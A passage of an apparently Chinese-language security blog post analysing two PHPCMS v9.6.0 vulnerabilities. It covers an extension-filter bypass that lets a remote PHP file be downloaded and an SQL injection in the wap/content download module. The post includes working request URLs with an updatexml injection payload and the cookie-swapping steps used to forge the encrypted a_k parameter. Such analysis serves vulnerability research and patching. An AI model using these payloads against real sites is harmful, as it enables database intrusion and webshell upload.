class="hljs-keyword">as</span> $matche)</span><br><span class="line">		{</span><br><span class="line">			<span class="hljs-keyword">if</span>(strpos($matche, <span class="hljs-string">&apos;://&apos;</span>) === <span class="hljs-keyword">false</span>) <span class="hljs-keyword">continue</span>;</span><br><span class="line">			dir_create($uploaddir);</span><br><span class="line">			$remotefileurls[$matche] = <span class="hljs-keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">		}</span><br><span class="line">		<span class="hljs-keyword">unset</span>($matches, $string);</span><br><span class="line">		$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">		$oldpath = $newpath = <span class="hljs-keyword">array</span>();</span><br><span class="line">		<span class="hljs-keyword">foreach</span>($remotefileurls <span class="hljs-keyword">as</span> $k=&gt;$file) {</span><br><span class="line">			<span class="hljs-keyword">if</span>(strpos($file, <span class="hljs-string">&apos;://&apos;</span>) === <span class="hljs-keyword">false</span> || strpos($file, $upload_url) !== <span class="hljs-keyword">false</span>) <span class="hljs-keyword">continue</span>;</span><br><span class="line">			$filename = fileext($file);</span><br><span class="line">			$file_name = basename($file);</span><br><span class="line">			$filename = <span class="hljs-keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">			$newfile = $uploaddir.$filename;</span><br><span class="line">			$upload_func = <span class="hljs-keyword">$this</span>-&gt;upload_func;</span><br><span class="line">			<span class="hljs-keyword">if</span>($upload_func($file, $newfile)) {</span><br><span class="line">				$oldpath[] = $k;</span><br><span class="line">				$GLOBALS[<span class="hljs-string">&apos;downloadfiles&apos;</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">				@chmod($newfile, <span class="hljs-number">0777</span>);</span><br><span class="line">				$fileext = fileext($filename);</span><br><span class="line">				<span class="hljs-keyword">if</span>($watermark){</span><br><span class="line">					watermark($newfile, $newfile,<span class="hljs-keyword">$this</span>-&gt;siteid);</span><br><span class="line">				}</span><br><span class="line">				$filepath = $dir.$filename;</span><br><span class="line">				$downloadedfile = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;filename&apos;</span>=&gt;$filename, <span class="hljs-string">&apos;filepath&apos;</span>=&gt;$filepath, <span class="hljs-string">&apos;filesize&apos;</span>=&gt;filesize($newfile), <span class="hljs-string">&apos;fileext&apos;</span>=&gt;$fileext);</span><br><span class="line">				$aid = <span class="hljs-keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line">				<span class="hljs-keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">		<span class="hljs-keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">	}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x9996;&#x5148;&#x9650;&#x5236;&#x4E86;&#x5176;&#x4E2D; <code>$ext</code> &#x53EA;&#x5141;&#x8BB8;&#x4E3A;<code>gif|jpg|jpeg|bmp|png</code> </p>
+<p>153&#x884C; &#x8FDB;&#x884C;&#x4E86;&#x4E00;&#x4E2A;&#x8FC7;&#x6EE4;</p>
+<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span>(!preg_match_all(<span class="hljs-string">&quot;/(href|src)=([\&quot;|&apos;]?)([^ \&quot;&apos;&gt;]+\.($ext))\\2/i&quot;</span>, $string, $matches)) <span class="hljs-keyword">return</span> $value;</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x8FD9;&#x91CC;&#x5339;&#x914D;&#x4E86;<code>src</code>&#x6216;<code>href</code>&#x4E2D;&#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;&#xFF0C;&#x4E0D;&#x8FC7;&#x540E;&#x7F00;&#x4E3A;<code>$ext</code>&#xFF0C;&#x5176;&#x4E2D;<code>$ext</code>&#x7684;&#x503C;&#x4E3A;&#xFF1A;<code>gif|jpg|jpeg|bmp|png</code></p>
+<p><code>http://ip/p2hm1n.php#a.jpg</code> &#x5373;&#x53EF;&#x7ED5;&#x8FC7;&#x6B63;&#x5219;</p>
+<p>158&#x884C; &#x4F7F;&#x7528;&#x4E86; <code>fillurl</code> &#x51FD;&#x6570;&#x8FDC;&#x7A0B;&#x52A0;&#x8F7D;&#x8D44;&#x6E90;&#xFF0C;&#x8FD8;&#x5427; # &#x4E4B;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x5168;&#x90E8;&#x79FB;&#x9664;</p>
+<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">$pos = strpos($surl,<span class="hljs-string">&apos;#&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">if</span>($pos&gt;<span class="hljs-number">0</span>) $surl = substr($surl,<span class="hljs-number">0</span>,$pos);</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><code>P2hm1n.php#a.jpg</code> &#x4F1A;&#x88AB;&#x5904;&#x7406;&#x6210; <code>P2hm1n.php</code></p>
+<p>&#x4E4B;&#x540E;&#x8C03;&#x7528; <code>download</code> &#x65B9;&#x6CD5;&#x3002;&#x7A0B;&#x5E8F;&#x76F4;&#x63A5;&#x8C03;&#x7528; <code>copy</code> &#x51FD;&#x6570;&#x5C06;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;&#x672C;&#x5730;</p>
+<h2 id="wap&#x6A21;&#x5757;-SQL&#x6CE8;&#x5165;"><a href="#wap&#x6A21;&#x5757;-SQL&#x6CE8;&#x5165;" class="headerlink" title="wap&#x6A21;&#x5757; SQL&#x6CE8;&#x5165;"></a>wap&#x6A21;&#x5757; SQL&#x6CE8;&#x5165;</h2><h3 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;-1"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;-1" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h3><p>&#x8BBF;&#x95EE; <code>http://phpcms/index.php?m=wap&amp;a=index&amp;siteid=1</code></p>
+<blockquote>
+<p>PS: &#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x662F;&#x4E0D;&#x5177;&#x5907;war&#x6A21;&#x5757;&#x7684;&#xFF0C;&#x8DDF;&#x8FDB;&#x540E;&#x53F0;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x597D;&#x50CF;&#x8DDF;&#x624B;&#x673A;&#x95E8;&#x6237;&#x7F51;&#x7AD9;&#x6709;&#x5173;&#xFF0C;&#x4F46;&#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x5F71;&#x54CD;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;</p>
+</blockquote>
+<p>&#x76F4;&#x63A5;&#x53D1;&#x5305;&#x81F3; repeater &#x6A21;&#x5757;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/qFr95yWlGcEsjZM-20201117115108047.jpg" alt></p>
+<p>&#x5C06;&#x8FD4;&#x56DE;&#x7684; <code>Set-Cookie</code> &#x4E2D;<code>TVAUD_siteid</code>&#x503C;&#x9644;&#x503C;&#x7ED9; <code>userid_flash</code>&#x53D8;&#x91CF;<br>&#x56E0;&#x6B64; <code>userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY</code></p>
+<p>&#x8BBF;&#x95EE; </p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/phpcms/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x5E76; POST &#x4F20;&#x53C2; <code>userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY</code><br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VSoJDEBZkU7Fsw8-20201117115108185.jpg" alt></p>
+<p>&#x5C06;&#x8FD4;&#x56DE;&#x7684; <code>Set-Cookie</code> &#x4E2D;<code>TVAUD_att_json</code>&#x503C;&#x9644;&#x503C;&#x7ED9; <code>a_k</code>&#x53C2;&#x6570;</p>
+<p>GET&#x578B;&#x8BBF;&#x95EE; </p>
+<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">http://phpcms/index.php?m=content&amp;c=down&amp;a_k=4639DgUMpurTOZjooOJq4TX6Y0Q_XVqujouwKcrfLTvAEJjgOjGhm4VLN5AZ3CQkIcSOFCoDh8V7NVmGuVvN6hrYV59KmsRC0SO-V_b6hLXhJxDw4DuOEQ1KS2RPKSae8keEN8PbbTo7fICqQnhDpFhUN5JSRgScbgnQggVE7d56earVmPST9Lw</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3fuanq7rCEoSyOZ-20201117115108205.jpg" alt></p>
+<h3 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;-1"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;-1" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h3><p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;&#x5728; <code>phpcms/modules/content/down.php</code> &#x7684; <code>init()</code> &#x51FD;&#x6570;<br>12 &#x884C; GET&#x65B9;&#x5F0F;&#x4F20;&#x5165; <code>a_k</code>&#x53C2;&#x6570;<br>14 &#x884C; &#x6839;&#x636E; <code>DECODE</code> &#x5224;&#x65AD;&#x5176; <code>sys_auth</code> &#x4E3A;&#x4E00;&#x4E2A;&#x89E3;&#x5BC6;&#x51FD;&#x6570;&#x3002;&#x76F4;&#x63A5;&#x8BC1;&#x660E;&#x2014;&#x2014;&#x300B;<code>a_k</code>&#x53C2;&#x6570;&#x4E4B;&#x524D;&#x662F;&#x7ECF;&#x8FC7;&#x52A0;&#x5BC6;&#x7684;&#x3002;&#x8FD9;&#x4E2A;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x5176;&#x5B9E;&#x5F88;&#x957F;&#xFF0C;&#x6211;&#x4EEC;&#x5176;&#x5B9E;&#x4E0D;&#x7528;&#x53BB;&#x770B;&#x5B83;&#x7684;&#x4E00;&#x4E2A;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x3002;<br>17 &#x884C; &#x4F7F;&#x7528; <code>parse_str()</code> &#x51FD;&#x6570;&#x5904;&#x7406; &#x3002;  <code>parse_str()</code> &#x51FD;&#x6570;&#x4F1A;&#x81EA;&#x52A8;&#x5BF9;&#x4F20;&#x5165;&#x7684;&#x503C;&#x5C06;&#x5176;&#x6839;&#x636E;<code>&amp;</code>&#x5206;&#x5272;&#xFF0C;&#x7136;&#x540E;&#x89E3;&#x6790;&#x5230;&#x5177;&#x4F53;&#x53D8;&#x91CF;&#x5E76;&#x6CE8;&#x518C;&#x53D8;&#x91CF;&#xFF0C;&#x5E76;&#x4E14;&#x5BF9;&#x5185;&#x5BB9;&#x8FDB;&#x884C;URL&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Y36mPkxv12pZhlM-20201117115108098.jpg" alt><br>26 &#x884C; &#x5F15;&#x7528;&#x672A;&#x6CE8;&#x518C;&#x53D8;&#x91CF; <code>array(&#x2018;id&#x2019;=&gt;$id)</code> &#xFF0C;&#x4F46;&#x8FD9;&#x91CC;&#x7684;<code>id</code>&#x53EF;&#x4EE5;&#x4ECE;<code>parse_str</code>&#x51FD;&#x6570;&#x5904;&#x7406;<code>$a_k</code>&#x540E;&#x5F97;&#x5230;&#x3002;&#x4E14;&#x8C03;&#x7528; <code>get_one</code> &#x65B9;&#x6CD5;&#x3002;</p>
+<p><code>get_one</code>&#x65B9;&#x6CD5;&#x5B9A;&#x4E49;&#x70B9;&#x5728;  <code>/phpcms/libs/classes/model.class.php</code> 73-76&#x884C;&#x3002;&#x8DDF;&#x8FDB;&#x53D1;&#x73B0;&#x8FD9;&#x91CC;&#x7684; <code>get_one</code> &#x65B9;&#x6CD5;&#x5176;&#x5B9E;&#x5C31;&#x662F; SQL &#x67E5;&#x8BE2;&#x3002;&#x4E14;&#x7528;&#x5230;&#x4E86; <code>sqls</code> &#x65B9;&#x6CD5;&#x3002;<br>&#x8DDF;&#x8FDB; <code>sqls</code> &#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x5BF9;&#x6570;&#x7EC4;&#x53C2;&#x6570;&#x7684;&#x4E00;&#x4E2A;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VzLkrIoPJFl15Di-20201117115108399.jpg" alt><br>&#x4E14;&#x4ECE;&#x5934;&#x5230;&#x4F4D;&#x90FD;&#x6CA1;&#x6709;&#x5BF9;<code>$id</code> &#x53C2;&#x6570;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x5904;&#x7406;&#x3002;&#x56E0;&#x6B64;&#x5B58;&#x5728; sql &#x6CE8;&#x5165;&#x6F0F;&#x6D1E;</p>
+<p>&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x6839;&#x636E; &#x4ECE;<code>parse_str</code>&#x51FD;&#x6570;&#x5904;&#x7406;<code>$a_k</code>&#x540E;&#x5F97;&#x5230;&#x7684; <code>id</code> &#x63A8;&#x65AD;&#x51FA;&#x4E86;&#x5B58;&#x5728; sql&#x6CE8;&#x5165;&#x3002;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x6211;&#x4EEC;&#x63A8;&#x65AD;&#x4E2D;&#x5FFD;&#x7565;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x3002;&#x56E0;&#x6B64;&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x627E;&#x5230;&#x5E26;&#x6709; sql&#x6CE8;&#x5165;payload &#x7ECF;&#x8FC7;&#x4E00;&#x6B21;&#x52A0;&#x5BC6;&#x4E4B;&#x540E;&#x7684; payload&#x3002;</p>
+<p><strong>&#x6838;&#x5FC3;&#x76EE;&#x7684;&#xFF1A;&#x6784;&#x9020;&#x52A0;&#x5BC6;&#x540E;&#x7684; <code>$a_k</code> &#x53D8;&#x91CF;</strong></p>
+<p><strong>&#x601D;&#x8DEF;&#x4E00;&#xFF1A;&#x4F2A;&#x9020;&#x52A0;&#x5BC6;&#x8FC7;&#x7A0B;&#xFF1A;&#x76F4;&#x63A5;&#x5BF9;&#x5E94;&#x6E90;&#x7801;&#x4E2D;&#x52A0;&#x5BC6;&#x4EE3;&#x7801;&#xFF0C;&#x8FDB;&#x884C;&#x672C;&#x5730;&#x52A0;&#x89E3;&#x5BC6;&#x3002;</strong><br>&#x4EA7;&#x751F;&#x95EE;&#x9898;&#xFF1A;&#x6E90;&#x7801;&#x4E2D;&#x5BF9;&#x5E94;&#x7684; auth_key &#x503C;&#x6765;&#x81EA;&#x670D;&#x52A1;&#x5668;&#x3002;&#x4E14;&#x6BCF;&#x4E2A;&#x7AD9;&#x70B9;&#x8FD9;&#x4E2A; auth_key &#x53EF;&#x80FD;&#x4E0D;&#x4E00;&#x6837;&#x3002;</p>
+<p><strong>&#x601D;&#x8DEF;&#x4E8C;&#xFF1A;&#x5BFB;&#x627E;&#x6E90;&#x7801;&#x4E2D;&#x8C03;&#x7528;&#x6B64;&#x52A0;&#x5BC6;&#x7684;&#x5730;&#x65B9;&#x3002;&#x4E14;&#x53EF;&#x56DE;&#x663E;&#x52A0;&#x5BC6;&#x540E;&#x4EE3;&#x7801;</strong><br>&#x65B9;&#x6CD5;&#xFF1A; &#x5168;&#x5C40;&#x641C;&#x7D22; sys_auth &#x3002;<br><code>phpcms\libs\classes\param.class.php</code> &#x4E2D;&#x5B58;&#x5728; <code>set_cookie</code> &#x65B9;&#x6CD5;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5BUeGSb2Oyzhqj4-20201117115108323.jpg" alt><br>&#x5BFB;&#x627E;&#x54EA;&#x91CC;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;sql&#x6CE8;&#x5165;&#x7684;&#x4F20;&#x5165;&#x70B9;&#x3002;&#x4E14;&#x53EF;&#x901A;&#x8FC7; cookie &#x52A0;&#x5BC6;&#x83B7;&#x5F97;&#x52A0;&#x5BC6;&#x540E; payload<br>&#x5173;&#x952E;&#x70B9;&#xFF1A;<code>phpcms/modules/attachment/attachments.php</code> &#x7684; <code>swfupload_json</code> &#x65B9;&#x6CD5;&#x3002;</p>
+<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swfupload_json</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">	$arr[<span class="hljs-string">&apos;aid&apos;</span>] = intval($_GET[<span class="hljs-string">&apos;aid&apos;</span>]);</span><br><span class="line">	$arr[<span class="hljs-string">&apos;src&apos;</span>] = safe_replace(trim($_GET[<span class="hljs-string">&apos;src&apos;</span>]));</span><br><span class="line">	$arr[<span class="hljs-string">&apos;filename&apos;</span>] = urlencode(safe_replace($_GET[<span class="hljs-string">&apos;filename&apos;</span>]));</span><br><span class="line">	$json_str = json_encode($arr);</span><br><span class="line">	$att_arr_exist = param::get_cookie(<span class="hljs-string">&apos;att_json&apos;</span>);</span><br><span class="line">	$att_arr_exist_tmp = explode(<span class="hljs-string">&apos;||&apos;</span>, $att_arr_exist);</span><br><span class="line">	<span class="hljs-keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {</span><br><span class="line">		<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">	} <span class="hljs-keyword">else</span> {</span><br><span class="line">		$json_str = $att_arr_exist ? $att_arr_exist.<span class="hljs-string">&apos;||&apos;</span>.$json_str : $json_str;</span><br><span class="line">		param::set_cookie(<span class="hljs-string">&apos;att_json&apos;</span>,$json_str);</span><br><span class="line">		<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;			</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>&#x901A;&#x8FC7; GET &#x4F20;&#x5165;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570; <code>aid</code> &#x7ECF;&#x8FC7;&#x4E86; <code>intval</code> &#x51FD;&#x6570;&#x5904;&#x7406;&#xFF0C;&#x90A3;&#x4E48;&#x4E0D;&#x592A;&#x9002;&#x5408;&#x901A;&#x8FC7;&#x6B64;&#x5904;&#x4F20;&#x5165;payload&#x3002;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570; <code>src</code> &#x7ECF;&#x8FC7;&#x4E86; <code>safe_replace</code>&#x5904;&#x7406;&#x3002;&#x7B2C;&#x4E09;&#x4E2A; <code>filename</code> &#x901A;&#x8FC7; <code>safe_replace</code> &#x548C; &#x4E00;&#x6B21;url &#x7F16;&#x7801;&#x5904;&#x7406;&#x3002;&#x4E4B;&#x540E;&#x505A; <code>json_encode</code> &#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6700;&#x7EC8;&#x518D;&#x8C03;&#x7528; <code>set_cookie</code> &#x65B9;&#x6CD5;&#x3002;<br>&#x8DDF;&#x8FDB;&#x4E00;&#x4E0B; <code>safe_replace</code> &#x65B9;&#x6CD5;&#xFF0C;&#x53D1;&#x73B0;&#x662F;&#x901A;&#x8FC7; <code>str_replace</code> &#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x4E14;&#x6CA1;&#x6709;&#x901A;&#x8FC7;&#x5FAA;&#x73AF;&#x904D;&#x5386;&#x6765;&#x8FC7;&#x6EE4;&#xFF0C;&#x5B83;&#x53EA;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x3002;&#x90A3;&#x4E48;&#x4E24;&#x4E24;&#x7EC4;&#x5408;&#x4E00;&#x4E0B;&#xFF0C;&#x7136;&#x540E;&#x66FF;&#x6362;&#xFF0C;&#x4ECE;&#x800C;&#x8FBE;&#x5230; bypass &#x7684;&#x6548;&#x679C;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fdxGa6P3iTprsV2-20201117115108325.jpg" alt></p>
+<p>&#x4F46;&#x662F;&#x5728;&#x89E6;&#x53D1;  <code>set_cookie</code> &#x7684; <code>swfupload_json</code> &#x65B9;&#x6CD5;&#xFF0C;&#x4E4B;&#x524D;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x6761;&#x4EF6;&#x3002;<br>&#x5728;<code>phpcms/modules/attachment/attachments.php</code>&#x7B2C;&#x5341;&#x884C;&#x7684; <code>attachments</code> &#x7C7B;&#x3002;&#x5176;&#x4E2D; <code>__construct</code> &#x65B9;&#x6CD5;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x505A;&#x7C7B;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5DE5;&#x4F5C;&#x3002;&#x5176;&#x4E2D;&#x6709;&#x7528;&#x6237;&#x767B;&#x5F55;&#x72B6;&#x6001;&#x68C0;&#x6D4B;&#x3002;21&#x884C;&#x9650;&#x5236; <code>$this&#x2192;userid</code> &#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&#xFF0C;&#x5426;&#x5219;&#x8DF3;&#x8F6C;&#x5230;&#x767B;&#x5F55;&#x754C;&#x9762;<br>17 &#x884C; &#x7A0B;&#x5E8F;&#x5E76;&#x6CA1;&#x6709;&#x68C0;&#x67E5; <code>$this-&gt;userid</code> &#x7684;&#x6709;&#x6548;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x8981;&#x4F20;&#x5165;&#x7684; <code>userid_flash</code> &#x662F;&#x52A0;&#x5BC6;&#x503C;&#x5C31;&#x80FD;&#x591F;&#x89E3;&#x5BC6;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x68C0;&#x6D4B;&#x3002;<br>&#x83B7;&#x53D6; <code>userid_flash</code>&#x52A0;&#x5BC6;&#x503C;&#xFF1A;&#x5728;<code>phpcms/modules/wap/index.php</code> &#x6587;&#x4EF6;&#x3002;&#x901A;&#x8FC7; cookie &#x83B7;&#x53D6; <code>$_GET[&#x2018;siteid&#x2019;]</code> &#x52A0;&#x5BC6;&#x540E;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x4F5C;&#x4E3A; <code>$_POST[&#x2018;userid_flash&#x2019;]</code> &#x7684;&#x503C;&#xFF0C;&#x5373;&#x53EF;&#x7ED5;&#x8FC7;&#x767B;&#x5F55;&#x68C0;&#x6D4B;&#x3002;</p>
+<p>&#x53C2;&#x8003;&#x6587;&#x7AE0;</p>
+<blockquote>
+<p><a href="https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/</a><br><a href="https://www.hackersb.cn/hacker/219.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/219.html</a><br><a href="https://www.freebuf.com/articles/web/202914.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/202914.html</a><br><a href="http://blog.nsfocus.net/phpcms-v9-6-content-module-sql-injection-vulnerability-analysis/" target="_blank" rel="noopener">http://blog.nsfocus.net/phpcms-v9-6-content-module-sql-injection-vulnerability-analysis/</a></p>
+</blockquote>
+</body></html>
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">#漏洞分析</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/PHPCMS/">#PHPCMS</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/12/07/360%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%AF%81%E4%B9%A6/">360网络安全职业认证 - CSSJ</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/09/05/%E4%BB%A5%E8%B4%AD%E7%89%A9%E6%B5%81%E7%A8%8B%E6%8C%96%E6%8E%98%E5%95%86%E5%9F%8E%E6%BC%8F%E6%B4%9E/">以购物流程挖掘商城漏洞</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2021 P2hm1n&nbsp;
+                 
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/P2hm1n" target="_blank" rel="noopener">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("zh-CN");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
